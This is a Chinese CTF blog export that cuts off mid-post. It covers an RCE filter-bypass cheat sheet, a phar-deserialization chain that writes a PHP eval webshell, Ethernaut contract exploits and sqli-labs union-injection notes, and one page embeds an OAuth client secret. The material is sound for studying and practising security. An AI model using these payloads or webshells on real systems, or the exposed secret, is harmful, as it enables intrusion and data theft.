{"pages":[{"title":"","text":"🚩 A CTFer 💖 ACGN 🖥️ Web 2.0 &amp; Web .03 🪗 Smart Contract My Skill Set Frontend Backend DevOps Connect with me About My Username这不得不得提起我的高中生活了。高一军训的时候，教官叫我小胖，于是我同学就开始叫我阿胖。我的高中英语老师普通话不标准，掺杂着一股浓烈的方言味道，甚至英文单词都有一股浓烈的“地方特色”，有一天，他读课文，兴致正浓，刚好读到了一句话，恰巧这句话里又有一个upon，而这个upon他又专门停顿一下，重(zhong)读。当时，一股雄厚无比而又夹杂着方言味道的声浪袭来，之后我同学都管我叫upon了。 至于后面的数字，俺比较懒，哪年注册的后面就写的哪年，当然也有特例，就是2016，这个代表的不是2016年，而是指比特币每2016个区块会变更一次挖矿难度，在一些与区块链有关的社区，我注册的id大多是UPON-2016","link":"/about/index.html"},{"title":"","text":"你似乎来到了世界的尽头","link":"/album/index.html"},{"title":"","text":"&nbsp;&nbsp;听听音乐 音乐播放器由mePlayer提供，布局参照网友博客所作，感谢作者的辛勤付出。更多音乐分享请查看歌单。 &nbsp;&nbsp;看看视频 ->点击以下条目开始播放视频,向下滑动查看更多","link":"/media/index.html"},{"title":"","text":"友情链接还在添加中qwq 加载中，稍等几秒...","link":"/friend/index.html"},{"title":"音乐歌单收藏","text":"温馨提示：选择喜欢的音乐双击播放，由于版权原因部分不能播放。如果喜欢歌单收藏一下，去网易云都能播放哟！","link":"/music/index.html"},{"title":"","text":"碎碎念 tips：github登录后按时间正序查看、可点赞加❤️、本插件地址..「+99次查看」 碎碎念加载中，请稍等... $.getScript(\"/js/gitalk_self.min.js\", function () { var gitalk = new Gitalk({ clientID: '46a9f3481b46ea0129d8', clientSecret: '79c7c9cb847e141757d7864453bcbf89f0655b24', id: '666666', repo: 'issue_database', owner: 'removeif', admin: \"removeif\", createIssueManually: true, distractionFreeMode: false }); gitalk.render('comment-container1'); });","link":"/self-talking/index.html"},{"title":"","text":"来而不往非礼也畅所欲言，有留必应","link":"/message/index.html"}],"posts":[{"title":"命令执行备忘录","text":"0x00 什么是RCERCE又称远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 0x01 常见命令执行函数12PHP代码执行函数：eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()... 12PHP命令执行函数：system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()... 0x02 Bypass1.关键词拦截: 关键词替换为空的情况: 双写绕过，比如cacatt -&gt; cat 仅拦截关键字: 使用其他函数，比如拦截cat的时候，可以使用其他命令。 Input Ouput static-sh ./flag.txt ./flag.txt: line 1: flag{this_is_a_test}: not found paste ./flag.txt /etc/passwd flag{this_is_a_test} root:x:0:0:root:/root:/bin/bash… diff diff ./flag.txt /etc/passwd curl file:///home/coffee/flag flag{this_is_a_test} … … 通配符绕过，比如可以使用/b??/c?t f*。该方法有时候会因为输出过多或者运行时间超出限制被强行中断 插入&quot;&quot; &lt;&gt; '' \\绕过,比如ca''t flag.txt或者ca\\t flag.txt 内联执行，将反引号内命令的输出作为输入执行,如: cat `ls`，或者是cat ${ls} 使用变量替换，如$c=a;cat fl$cg.php 拦截空格,空格可以用以下字符串代替： &lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等，比如: 123456cat%09flag{cat,flag.txt}cat${IFS}flag.txtcat$IFS$9flag.txtcat&lt;flag.txt cat&lt;&gt;flag.txt .操作符 eval函数中用.把被拦截的关键字给分开，比如 12&lt;?php eval(include &quot;/www/lo&quot;.&quot;g/nginx/access.log&quot;); 逃逸，绕过太难了，直接润出来比如 12c=include$_GET[1]?&gt; c=eval($_GET[1]) 借壳生蛋 12345678&lt;?php $env = $_GET['env']; if(isset($env)){ putenv($env); system(&quot;whoami&quot;); }else{ highlight_file(__FILE__); } ?env=BASH_FUNC_whoami%%=() { ls; }whoami是system(“whoami”)启动的bash环境的函数，相当于我们注册了一个whoami替换它 构造 在PHP7中，可以这样调用函数: 123('phpinfo')();$a = &quot;phpinfo&quot;;$$a;... 然后就可以使用异或^,取反~，自增++，自减--等方法构造想要的字符然后进行动态函数调用。 构造字符的时候，可以利用一些PHP的特性： PHP中的NAN和INF： 123456NaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。INF：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。$_=C/C;//NAN$_=1/C//INF 2.无回显 利用sleep()之类的函数来根据服务器响应的时间一个一个字符获获取注:该方法局限性很大，且容易受到网络波动影响，不建议优先考虑使用 利用dns外带http://dnslog.cn/注:该方法也有一定的局限性，有长度限制而且不支持特殊字符 利用重定向，将输出重定向到可访问网页中 反弹shell如果题目不出网只能寄 命令注入,尝试在命令后面加上||、%0a、%0d、|、;、&amp;等符号将原先重定向到/dev/null的命令分割开 3.include 伪协议 日志包含UA写马,包含access.log allow_url_include=ture可以使用的data123456789101112131415data类型扩展: data类型扩展 data:,&lt;文本数据&gt; data:text/plain,&lt;文本数据&gt; data:text/html,&lt;HTML代码&gt; data:text/html;base64,&lt;base64编码的HTML代码&gt; data:text/css,&lt;CSS代码&gt; data:text/css;base64,&lt;base64编码的CSS代码&gt; data:text/javascript,&lt;Javascript代码&gt; data:text/javascript;base64,&lt;base64编码的Javascript代码&gt; data:image/gif;base64,base64编码的gif图片数据 data:image/png;base64,base64编码的png图片数据 data:image/jpeg;base64,base64编码的jpeg图片数据 data:image/x-icon;base64,base64编码的icon图片数据 Tips: PHP具有极强的鲁棒性特别耐操，尤其是伪协议这块。1234567原payload:php://filter/convert.base64-encode/resource=index.php我可以插♂ 入一些奇怪的东西php://filter/convert.base64-encode/114514/resource=index.php我可以大大小小php://FiLTer/convert.base64-encode/resource=index.php 4.无参命令执行这种就基本没活能整了，已经十分固定下来了 123456&lt;?phphighlight_file(__FILE__);if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) { eval($_GET['code']);}?&gt; '/[^\\W]+\\((?R)?\\)/'的解释 这里使用pregreplace替换匹配到的字符为空，\\w匹配字母、数字和下划线，等价于 [^A-Za-z0-9]，然后(?R)?这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数），将匹配的替换为空，判断剩下的是否只有; 以上正则表达式只匹配a(b(c()))或a()这种格式，不匹配a(“123”)，也就是说我们传入的值函数不能带有参数，所以我们要使用无参数的函数进行文件读取或者命令执行。 一些有用的东西 12345678910111213141516171819202122目录操作：getchwd() ：函数返回当前工作目录。scandir() ：函数返回指定目录中的文件和目录的数组。dirname() ：函数返回路径中的目录部分。chdir() ：函数改变当前的目录。数组相关的操作：end() - 将内部指针指向数组中的最后一个元素，并输出。next() - 将内部指针指向数组中的下一个元素，并输出。prev() - 将内部指针指向数组中的上一个元素，并输出。reset() - 将内部指针指向数组中的第一个元素，并输出。each() - 返回当前元素的键名和键值，并将内部指针向前移动。array_shift() - 删除数组中第一个元素，并返回被删除元素的值。读文件show_source() - 对文件进行语法高亮显示。readfile() - 输出一个文件。highlight_file() - 对文件进行语法高亮显示。file_get_contents() - 把整个文件读入一个字符串中。readgzfile() - 可用于读取非 gzip 格式的文件 PAYLOAD 请求头 123GET /1.php?code=eval(end(getallheaders())); HTTP/1.1.....flag: system('id'); get_defined_vars() 1?code=eval(end(current(get_defined_vars())));&amp;flag=system('ls'); 利用全局变量进RCE get_defined_vars()：返回由所有已定义变量所组成的数组，会返回 _GET,_POST, _COOKIE, _FILES全局变量的值，返回数组顺序为get-&gt;post-&gt;cookie-&gt;filescurrent：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回$_GET变量的数组值 3.session_start() session_start()：启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回 FALSE,返回参数给session_id() session_id()：获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）。文件读取 show_source(session_id(session_start())); var_dump(file_get_contents(session_id(session_start()))) highlight_file(session_id(session_start())); readfile(session_id(session_start()));抓包传入Cookie: PHPSESSID=(想读的文件)即可","link":"/2022/10/03/RCE/"},{"title":"美团CTF决赛复现 mako","text":"太菜了，被大佬带进决赛了,最后就签个到 环境密码:1skr 下面部分是我在比赛的时候思考过的 1.开始页面一进来，十分的清爽，毛都没有，就一个上传文件的东西 随便传点东西，发现是来者不拒，啥都能传，但啥都干不了访问1.php只会出现404not found这是最令人异或的一点 因为题目给了docker，就本地部署一个环境，先进去看看文件都存到了哪里可以看见，文件并没有被上传到/var/www/html/这个目录下面 而文件被上传到了/var/www/html/mako/uploads这个目录下 可以肯定的是，文件上传是整不了活了 2.审计通过搜索关键词，在mako/app/reources/views/home.tpl.php里找到到了首页的源码 很明显，这是用模版渲染出来的主页, 图片都是以base64的编码形式传递的，没活整了。 这就很令人苦恼，我当时尝试了一下，使用软链接 直接寄了，没权限，这时候才想起来容器一开始写了一个读取flag的程序 目标也明确了，肯定得想办法执行readFlag，于是我搜了危险函数，然后是一无所获，要么没这个函数，要么根本无法触发 做到这里，我已经没有思路了，当时想到了反序列化，但是只知道搜unseralize，结果是毛都没搜到。 我经验太少了，当时没想到用phar 3.复现在mako/app/controllers/ImagesController.php文件中 123456789public function editGet(ViewFactory $view): string { chdir('/var/www/mako/uploads'); $fileName = $this-&gt;request-&gt;getQuery()-&gt;get('filename'); $image = new Image($fileName, new ImageMagick()); $dimensions = $image-&gt;getDimensions(); $this-&gt;view-&gt;assign('fileName', $fileName); $this-&gt;view-&gt;assign('dimensions', $dimensions); return $view-&gt;render('edit');} 可以看到，文件名是不做任何过滤的 而在mako/vendo/mako/framework/src/mako/pixl/image.php中 1234567891011121314151617public function __construct($image, ProcessorInterface $processor){ $this-&gt;image = $image; $this-&gt;processor = $processor; // Make sure that the image exists if(file_exists($this-&gt;image) === false) { throw new PixlException(vsprintf('The image [ %s ] does not exist.', [$this-&gt;image])); } // Set the image $this-&gt;processor-&gt;open($image);} 使用了能触发phar反序列化的file_exists函数 关键函数找到了，现在找链子吧 搜索__destruct(),干扰项不多，可以直接开撸 好家伙，我直接好家伙，一条龙服务了属于是qwq 4.攻击这里搬一手Arr3stY0u战队的poc吧 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpnamespace mako\\file{class FileSystem{}}namespace mako\\session\\stores{ use mako\\file\\FileSystem;class File{ protected $fileSystem; protected $sessionPath; public function __construct(){ $this-&gt;fileSystem = new FileSystem(); $this-&gt;sessionPath = '/var/www/mako/public/'; }}}namespace mako\\session{use mako\\session\\stores\\File;class Session{ protected $autoCommit; protected $destroyed = false; protected $sessionId; protected $sessionData = []; protected $store; public function __construct(){ $this-&gt;autoCommit = true; $this-&gt;destroyed = false; $this-&gt;store = new File(); $this-&gt;sessionId = 'shell.php'; $this-&gt;sessionData = ['a'=&gt;'&lt;?php eval($_POST[1]);?&gt;']; }}}namespace { $exp = new mako\\session\\Session(); $phar = new Phar('test.phar',0,'test.phar'); $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;'); $phar-&gt;setMetadata($exp); $phar-&gt;addFromString('text.txt','test'); $phar-&gt;stopBuffering();}; 上传文件getshellflag is here 5.总结反思经验不足，做题不够，欠练","link":"/2022/09/30/mt-ctf/"},{"title":"Ethernaut刷题记录","text":"踩坑记录来自这里 可见修饰符publicprivateethernaut0.注意事项 @openzeppelin/contracts/math/SafeMath.sol 的地址已经迁移，做这个靶场的时候得自己手动改成&quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;; 以太坊主网即将进行合并，Rinkeby测试网络将于一年后停止运行，到时候就不知道这个靶场是否还会继续运行 不同版本的solidity语言特性不一样，可能会有兼容问题 Rinkeby的测试以太难以大量获取，做题不要一股脑把以太全塞进去了 1.Fallout描述12345678910111213这很白痴是吧? 真实世界的合约必须安全的多, 难以入侵的多, 对吧?实际上... 也未必.Rubixi的故事在以太坊生态中非常知名. 这个公司把名字从 'Dynamic Pyramid' 改成 'Rubixi' 但是不知道怎么地, 他们没有把合约的 constructor 方法也一起更名:contract Rubixi { address private owner; function DynamicPyramid() { owner = msg.sender; } function collectAllFees() { owner.transfer(this.balance) } ...这让攻击者可以调用旧合约的constructor 然后获得合约的控制权, 然后再获得一些资产. 是的. 这些重大错误在智能合约的世界是有可能的. 合约代码12345678910111213141516171819202122232425262728293031323334353637383940414243// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Fallout { using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, &quot;caller is not the owner&quot; ); _; } function allocate() public payable { allocations[msg.sender] = allocations[msg.sender].add(msg.value); } function sendAllocation(address payable allocator) public { require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); } function collectAllocations() public onlyOwner { msg.sender.transfer(address(this).balance); } function allocatorBalance(address allocator) public view returns (uint) { return allocations[allocator]; }} 解:扔到remix里面调用Fal1out()函数就行了 2.Coin Flip描述这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。 合约代码123456789101112131415161718192021222324252627282930313233343536// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number.sub(1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; if (side == _guess) { consecutiveWins++; return true; } else { consecutiveWins = 0; return false; } }} 解:以太坊网络经典难题:熵的产生 使用区块哈希产生的随机数很容易被预测(只需要和它在同一个区块上就行了)，只需要写个中继合约打进去就行了（原来的合约基础之上改一点点就行了） 1234567891011121314function exp() public returns (bool) { uint256 blockValue = uint256(blockhash(block.number.sub(1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; c = CoinFlip(targetAddress); c.flip(side);} 注意：在某些预测随机数的题目中会返还以太，经常出现合约逻辑没有任何问题，但是就是运行出错的问题。 当合约收到一个calldata为空的call时，receive函数会被调用。这个函数会在执行一些以太币转账操作时被执行，常见的以太币转账操作包括.send()、.transfer()函数发起的转账。如果没有receive函数存在，但是存在一个payable属性的fallback函数的话，这个fallback函数会在一次以太币转账中被调用。如果一个合约既没有receive函数也没有payable属性的fallback函数，那么这个合约不能通过常规的交易来接收以太币，并且会抛出一个异常。 3.Telephone合约代码12345678910111213141516pragma solidity ^0.6.0;contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } }} 解:tx.orgin指的是交易的发起方，msg.sender是直接调用的一方，所以直接写合约调用这个函数就行了 123456789101112131415161718192021pragma solidity ^0.4.11;interface Telephone { function changeOwner(address _owner) external;}contract exploit { address targetAddr; Telephone t; address myaddr; function setInstance(address _targetAddr,address _myaddr) public { targetAddr=_targetAddr; myaddr= _myaddr; } function exp () public { t = Telephone(targetAddr); t.changeOwner(myaddr); }} 4.Token合约代码1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token { mapping(address =&gt; uint) balances; uint public totalSupply; constructor(uint _initialSupply) public { balances[msg.sender] = totalSupply = _initialSupply; } function transfer(address _to, uint _value) public returns (bool) { require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; } function balanceOf(address _owner) public view returns (uint balance) { return balances[_owner]; }} 解:很easy 溢出就完事了转个 115792089237316195423570985008687907853269984665640564039457584007913129639935就行了 5. Delegation合约代码123456789101112131415161718192021222324252627282930313233// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Delegate { address public owner; constructor(address _owner) public { owner = _owner; } function pwn() public { owner = msg.sender; }}contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) public { delegate = Delegate(_delegateAddress); owner = msg.sender; } fallback() external { (bool result,) = address(delegate).delegatecall(msg.data); if (result) { this; } }} 解：老生常谈， delegatecall相当于是去目标合约那块把相关的函数代码复制过来运行，而在solidity是个编译型语言，且存储使用的是slot[]这个大数组，变量是写死在代码里面的，一旦目标合约的变量环境和当前合约的变量环境不一样，就出大事，这题都做烂了，懒得写了 6.Force描述123有些合约就是拒绝你的付款,就是这么任性 ¯\\_(ツ)_/¯这一关的目标是使合约的余额大于0 合约代码123456789101112// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Force {/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =ø= / (______)__m_m)*/} 解：在Solidity里面，有个很特殊的自毁函数 selfdestruct(addr);随便写个合约，塞进去一个selfdestruct函数，然后指向题目 7.Vault合约代码123456789101112131415161718// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Vault { bool public locked; bytes32 private password; constructor(bytes32 _password) public { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } }} 解直接getStorageAt就行了，直接看 8.King合约代码12345678910111213141516171819202122232425262728// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract King { address payable king; uint public prize; address payable public owner; constructor() public payable { owner = msg.sender; king = msg.sender; prize = msg.value; } receive() external payable { require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; } function _king() public view returns (address payable) { return king; }} 解：1234567891011contract Attack { constructor(address payable target) public payable{ require(msg.value == 0.15 ether,&quot;Not enough!&quot;); target.call.gas(1000000).value(0.15 ether)(&quot;&quot;); } receive() external payable { revert(); }} 当submit题目打算回收“王权”时，它运行到king.transfer(msg.value);这一行时，由于king就是我们合约的地址，而我们合约的receive函数会执行revert，因此它会卡在这个状态无法执行，从而无法取回王权。 这个漏洞在实际合约中被用revert来执行DDos，让程序卡在某个状态无法运行。 麻了，在写攻击合约的时候又踩坑里了https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-2-sending-ether-receiving-ether-emitting-events/topic/sending-ether-send-vs-transfer-vs-call/ transfer:要求接收的智能合约中必须有一个fallback或者receive函数，否则会抛出一个错误(error)，并且revert（也就是回滚到交易前的状态）。而且有单笔交易中的操作总gas不能超过2300的限制。transfer函数会在以下两种情况抛出错误： 付款方合约的余额不足，小于所要发送的value 接收方合约拒绝接收支付 send:和transfer函数的工作方式基本一样，唯一的区别在于，当出现上述两种交易失败的情况时，send的返回结果是一个boolean值，而不会执行revert回滚。 call: call函数和上面最大的区别在于，它没有gas的限制，使用call时EVM将所有gas转移到接收合约上，形式如下: (bool success, bytes memory data) = receivingAddress.call{value: 100}(“”); 将参数设置为空会触发接收合约的fallback函数，使用call同样也可以调用本合约内的函数，形式如下 (bool sent, bytes memory data) = _to.call{gas :10000, value: msg.value}(byte4(keccack256(“function_name(uint256)”,args))); 9.Re-entrancy合约代码123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Reentrance { using SafeMath for uint256; mapping(address =&gt; uint) public balances; function donate(address _to) public payable { balances[_to] = balances[_to].add(msg.value); } function balanceOf(address _who) public view returns (uint balance) { return balances[_who]; } function withdraw(uint _amount) public { if(balances[msg.sender] &gt;= _amount) { (bool result,) = msg.sender.call{value:_amount}(&quot;&quot;); if(result) { _amount; } balances[msg.sender] -= _amount; } } receive() external payable {}} 解合约在进行提币时，使用 require 依次判断提币账户是否拥有相应的资产，随后使用 msg.sender.call.value(amount)() 来发送 Ether，处理完成后相应修改用户资产数据。 首先，使用call进行转账是个比较危险的操作，因为call会将当前剩下的gas一并发过去执行","link":"/2022/10/04/solidity/"},{"title":"SQL注入备忘录","text":"0x01 SQLSQL 是一种标准SQL 是一门 ANSI（American National Standards Institute 美国国家标准化组织）标准的计算机语言，但是仍然存在着多种不同版本的 SQL 语言。 库&amp;表一个数据库通常包括一个或多个表。每个表都有一个名字标识，表包含带有数据的记录。 SQL 基础语法最简单的查询SELECT * FROM 表名 这个语句会把当前表下所有的数据全都列出来，在数据量比较小的时候会很好用，但当数据量特别大的时候就容易被一堆数据淹没，不知所措。 这时候可以添加限制，指定我要哪一列的数据 SELECT 列名 FROM 表名 数据还是很多，可以添加WHERE来进行进一步限制 SELECT 列名 FROM 表名 WHERE 条件 如果需要将数据排序的话，可以用ORDER BY SELECT 列名 FROM 表名 WHERE 条件 ORDER BY 列名 有时候，咱只想返回前几条数据，就可以加入LIMIT SELECT 列名 FROM 表名 WHERE 条件 ORDER BY 列名 LIMIT 数字 SQL操作符WHERE 列名 LIKE 通配符 按照通配符匹配 通配符 描述 % 替代0个或多个字符 _ 替代1个字符 [charlist] 字符列中的任何单一字符 [^charlist] 或 [!charlist] 不在字符列中的任何单一字符 WHERE 列名 IN (‘值1’,’值2’) WHERE 列名 BETWEEN 值1 AND 值2; 联合查询SELECT 列名1,列名2… FROM table1 UNION SELECT 列名1,列名2… FROM table2; 注意:联合查询要求前后字段数相同，否则将会报错. 特殊的数据库information_schema摘自这里 在数据库里，有这样一个数据库information_schema，数据库是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。 表名 功能 SCHEMATA 提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。 TABLES 提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。 COLUMNS 供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。 STATISTICS 提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。 USER_PRIVILEGES 给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。 SCHEMA_PRIVILEGES 给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。 TABLE_PRIVILEGES（表权限） 给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。 COLUMN_PRIVILEGES（列权限） 给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。 CHARACTER_SETS（字符集） 提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。 … … 在注入的过程中，我们常用的是information_schema.tables下面的table_name以及table_schema表名及其所在的数据库名字。使用information_schema.columns下的column_name获取列名 select 的其他用法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667mysql&gt; select 1;+---+| 1 |+---+| 1 |+---+1 row in set (0.00 sec)mysql&gt; select 1,2,3;+---+---+---+| 1 | 2 | 3 |+---+---+---+| 1 | 2 | 3 |+---+---+---+1 row in set (0.00 sec)mysql&gt; select (1&gt;2);+-------+| (1&gt;2) |+-------+| 0 |+-------+1 row in set (0.00 sec)mysql&gt; select (1&lt;2);+-------+| (1&lt;2) |+-------+| 1 |+-------+1 row in set (0.00 sec)mysql&gt; select &quot;aaaa&quot;;+------+| aaaa |+------+| aaaa |+------+1 row in set (0.00 sec)mysql&gt; select (1&lt;2) from users;+-------+| (1&lt;2) |+-------+| 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 |+-------+13 rows in set (0.00 sec)mysql&gt; select (version());+-------------------------+| (version()) |+-------------------------+| 5.5.44-0ubuntu0.14.04.1 |+-------------------------+1 row in set (0.00 sec) SQL 注入常用函数字符拼接1. concat()函数 功能：将多个字符串连接成一个字符串。 语法：concat(str1, str2,…) 说明：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。 123456789101112131415161718mysql&gt; select concat('a','b','c') -&gt; ;+---------------------+| concat('a','b','c') |+---------------------+| abc |+---------------------+1 row in set (0.00 sec)mysql&gt; select concat('a','b','c','null') -&gt; ;+----------------------------+| concat('a','b','c','null') |+----------------------------+| abcnull |+----------------------------+1 row in set (0.00 sec) 2. concat_ws()函数 功能 和concat()一样，但是可以指定分隔符 语法：concat_ws(separator, str1, str2, …) 第一个参数指定分隔符。需要注意的是分隔符不能为null，如果为null，则返回结果为null。 12345678mysql&gt; select concat_ws('#','a','b','c','null') -&gt; ;+-----------------------------------+| concat_ws('#','a','b','c','null') |+-----------------------------------+| a#b#c#null |+-----------------------------------+1 row in set (0.00 sec) 3.group_concat()函数 功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。 语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator] ) 12345678mysql&gt; select 1,(select group_concat(username) from users); +---+---------------------------------------------------------------------------------------------+| 1 | (select group_concat(username) from users) |+---+---------------------------------------------------------------------------------------------+| 1 | Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 |+---+---------------------------------------------------------------------------------------------+1 row in set (0.00 sec) 盲注常用1.ascii()函数都会用，不说了 2.substr()函数 substr(str,pos,len);//str:字符串，pos：起始位置，len：截断长度 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647mysql&gt; select substr(&quot;abcdefg&quot;,1,1);+-----------------------+| substr(&quot;abcdefg&quot;,1,1) |+-----------------------+| a |+-----------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,1,3);+-----------------------+| substr(&quot;abcdefg&quot;,1,3) |+-----------------------+| abc |+-----------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,2,3);+-----------------------+| substr(&quot;abcdefg&quot;,2,3) |+-----------------------+| bcd |+-----------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,-2,3);+------------------------+| substr(&quot;abcdefg&quot;,-2,3) |+------------------------+| fg |+------------------------+1 row in set (0.01 sec)mysql&gt; select substr(&quot;abcdefg&quot;,-2,1);+------------------------+| substr(&quot;abcdefg&quot;,-2,1) |+------------------------+| f |+------------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,-3,2);+------------------------+| substr(&quot;abcdefg&quot;,-3,2) |+------------------------+| ef |+------------------------+1 row in set (0.00 sec) sleep()都会，不说了 报错注入常用updatexml()extractvalue()group by报错注入0x02 SQL注入靶场–Sqli-labsLess-1 | 显错注入判断注入点为字符型还是数字型: ?id=1 id=2 id=1+1 这里可以发现，没有对我们输入的1+1进行运算,可以确定是字符型注入。查看源代码 1$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;; 这里有个令人异或的地方:?id=1+1为啥返回了?id=1的结果，这里进mysql控制台里面康康。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061mysql&gt; select * from users where id='1+1';+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set, 1 warning (0.00 sec)mysql&gt; select * from users where id=1;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=&quot;1&quot;;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=&quot;1a&quot;;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set, 1 warning (0.00 sec)mysql&gt; select * from users where id=&quot;a1&quot;;Empty set (0.00 sec)mysql&gt; select * from users where id=&quot;0x1&quot;;Empty set (0.00 sec)mysql&gt; select * from users where id=0x1;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=+0b01;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=+ 0b01;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec) 这宛如PHP一样强大的鲁棒性，我已经有不好的预感了。 众所周知，方便程序员写代码 = 方便黑客进来搞事情。 更深入的测试联合注入: ?id=1’ union select 1,2,3 –+ 实际执行的是，这里--+是将后面的内容注释掉了 SELECT * FROM users WHERE id=’1’ union select 1,2,3 –+ LIMIT 0,1 好像啥都没变，不过在后端的代码里可以看见相关的逻辑 12345678if($row) { echo &quot;&lt;font size='5' color= '#99FF00'&gt;&quot;; echo 'Your Login name:'. $row['username']; echo &quot;&lt;br&gt;&quot;; echo 'Your Password:' .$row['password']; echo &quot;&lt;/font&gt;&quot;; } MySQL返回的是 1234567+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb || 1 | 2 | 3 |+----+----------+----------+2 rows in set (0.00 sec) 但因为后端代码的设计，只能显示第一条，这时候我们可以让前面id指向一个不存在的数据,这样第一条数据就只会返回空 1234567mysql&gt; SELECT * FROM users WHERE id='-1' union select 1,2,3; +----+----------+----------+| id | username | password |+----+----------+----------+| 1 | 2 | 3 |+----+----------+----------+1 row in set (0.00 sec) 开始爆金币数据了 ?id=-1’ union select 1,(select username from users limit 4,1),3 –+ 因为select username from users会返回多条数据，这时候使用limit来限制返回哪一行 这样子爆破数据不够爽，还得手动一个一个搓，太麻烦了,直接上group_concat() ?id=-1’ union select 1,(select 